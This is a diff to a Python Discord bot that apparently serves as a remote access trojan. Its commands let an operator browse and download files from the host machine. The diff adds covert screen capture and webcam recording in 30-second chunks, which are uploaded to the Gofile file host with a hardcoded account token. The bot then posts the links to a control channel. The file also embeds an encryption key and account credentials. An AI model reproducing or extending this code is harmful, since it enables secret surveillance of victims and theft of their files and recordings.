@@ -6,6 +6,14 @@ from PIL import ImageGrab
 import io
 import platform
 from cryptography.fernet import Fernet
+import requests
+import cv2
+import numpy as np
+from datetime import datetime, timedelta
+import asyncio
+import pygetwindow as gw
+import pyautogui
+import time
 
 # Decrypting the token
 key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
@@ -29,6 +37,11 @@ DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"
 if not os.path.exists(DOWNLOAD_DIR):
     os.makedirs(DOWNLOAD_DIR)
 
+# Gofile API endpoint and your credentials
+GOFILE_API_URL = "https://upload.gofile.io/uploadfile"
+GOFILE_ACCOUNT_TOKEN = "GpM5Bh6RYXbYcs2Uvwn4a7dIdCB20UM5"  # Your Gofile account token
+GOFILE_ACCOUNT_ID = "de7d5f38-3ce6-4763-b07d-2f17bc86703f"  # Your Gofile account ID
+
 # Helper function to create or get the user's channel
 async def get_or_create_channel(ctx, user_name):
     guild = bot.get_guild(GUILD_ID)  # Use the specific guild by ID
@@ -38,6 +51,26 @@ async def get_or_create_channel(ctx, user_name):
         # If the channel doesn't exist, create it
         channel = await guild.create_text_channel(user_name)
     return channel
+
+# Function to upload a file to Gofile and get the download link
+def upload_to_gofile(file_path):
+    with open(file_path, 'rb') as file:
+        files = {'file': file}
+        headers = {
+            'Authorization': f'Bearer {GOFILE_ACCOUNT_TOKEN}',
+            'X-Request-Id': GOFILE_ACCOUNT_ID
+        }
+        response = requests.post(GOFILE_API_URL, files=files, headers=headers)
+        if response.status_code == 200:
+            data = response.json()
+            return data.get('data', {}).get('downloadPage', '')
+        else:
+            return None
+
+# Custom converter for handling directory paths with spaces
+class PathConverter(commands.Converter):
+    async def convert(self, ctx, argument):
+        return argument
 
 # Command to handle file sending
 @bot.command()
@@ -117,7 +150,7 @@ async def filelist(ctx):
 
 # Command to download a specific directory or file
 @bot.command()
-async def download(ctx, path: str):
+async def download(ctx, *, path: PathConverter):
     # Check if the command is in the correct channel
     if ctx.channel.id != CHANNEL_ID:
         return
@@ -135,14 +168,147 @@ async def download(ctx, path: str):
             embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.blue())
             await ctx.send(embed=embed)
         elif os.path.isfile(path):
-            # Send the file as an attachment
-            await ctx.send(file=discord.File(path))
+            # Check if the file is larger than 5MB
+            if os.path.getsize(path) > 5 * 1024 * 1024:
+                # Upload the file to Gofile and get the download link
+                download_link = upload_to_gofile(path)
+                if download_link:
+                    embed = discord.Embed(title="Large File Upload", description=f"File {path} is too large. Download it from here: {download_link}", color=discord.Color.blue())
+                    await ctx.send(embed=embed)
+                else:
+                    embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.red())
+                    await ctx.send(embed=embed)
+            else:
+                # Send the file as an attachment
+                await ctx.send(file=discord.File(path))
         else:
             embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.red())
             await ctx.send(embed=embed)
     else:
         embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.red())
         await ctx.send(embed=embed)
+
+# Function to record screen using pyautogui and opencv for a given duration
+async def record_screen(duration, file_path):
+    # Get screen size
+    screen_size = pyautogui.size()
+    width, height = screen_size
+
+    # Define the codec and create VideoWriter object
+    fourcc = cv2.VideoWriter_fourcc(*"XVID")
+    out = cv2.VideoWriter(file_path, fourcc, 20.0, (width, height))
+
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        # Capture the screen
+        screenshot = pyautogui.screenshot()
+        frame = np.array(screenshot)
+        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+
+        # Write the frame into the file
+        out.write(frame)
+
+    # Release everything if job is finished
+    out.release()
+    cv2.destroyAllWindows()
+
+# Function to record webcam using opencv for a given duration
+def record_webcam(duration, output_path, camera_index=0):
+    # Open the webcam
+    cap = cv2.VideoCapture(camera_index)
+
+    if not cap.isOpened():
+        print("Error: Could not open webcam.")
+        return
+
+    # Define the codec and create VideoWriter object
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    frame_width = int(cap.get(3))
+    frame_height = int(cap.get(4))
+    out = cv2.VideoWriter(output_path, fourcc, 20.0, (frame_width, frame_height))
+
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        ret, frame = cap.read()
+        if not ret:
+            print("Failed to grab frame")
+            break
+        out.write(frame)
+
+    # Release everything if job is finished
+    cap.release()
+    out.release()
+    cv2.destroyAllWindows()
+
+# Command to record system screen in intervals and upload to Gofile
+@bot.command()
+async def record(ctx, duration: int):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        return
+
+    # Validate duration
+    if duration <= 0:
+        await ctx.send("Please provide a positive number of minutes to record.")
+        return
+
+    # Calculate total duration in seconds
+    total_duration = duration * 60
+
+    interval_duration = 30  # 30 seconds per interval
+    start_time = datetime.now()
+
+    while total_duration > 0:
+        # Record the screen for the interval
+        file_path = f'recorded_interval_{start_time.strftime("%Y%m%d_%H%M%S")}.avi'
+        await record_screen(interval_duration, file_path)
+
+        # Upload the video to Gofile in the background
+        asyncio.create_task(upload_and_send_link(ctx, file_path))
+
+        # Update the total duration
+        total_duration -= interval_duration
+        start_time = datetime.now()
+        await asyncio.sleep(interval_duration)
+
+# Command to record webcam in intervals and upload to Gofile
+@bot.command()
+async def webcam(ctx, duration: int, camera_index: int = 0):
+    # Check if the command is in the correct channel
+    if ctx.channel.id != CHANNEL_ID:
+        return
+
+    # Validate duration
+    if duration <= 0:
+        await ctx.send("Please provide a positive number of minutes to record.")
+        return
+
+    # Calculate total duration in seconds
+    total_duration = duration * 60
+
+    interval_duration = 30  # 30 seconds per interval
+    start_time = datetime.now()
+
+    while total_duration > 0:
+        # Record the webcam for the interval
+        file_path = f'recorded_interval_{start_time.strftime("%Y%m%d_%H%M%S")}.avi'
+        record_webcam(interval_duration, file_path, camera_index)
+
+        # Upload the video to Gofile in the background
+        asyncio.create_task(upload_and_send_link(ctx, file_path))
+
+        # Update the total duration
+        total_duration -= interval_duration
+        start_time = datetime.now()
+        await asyncio.sleep(interval_duration)
+
+# Function to upload a file to Gofile and send the link to the channel
+async def upload_and_send_link(ctx, file_path):
+    gofile_link = upload_to_gofile(file_path)
+    if gofile_link:
+        await ctx.send(f'30-second interval recorded and uploaded to Gofile: {gofile_link}')
+        # Delete the temporary file after uploading
+        os.remove(file_path)
 
 # Command to list all available commands
 @bot.command()
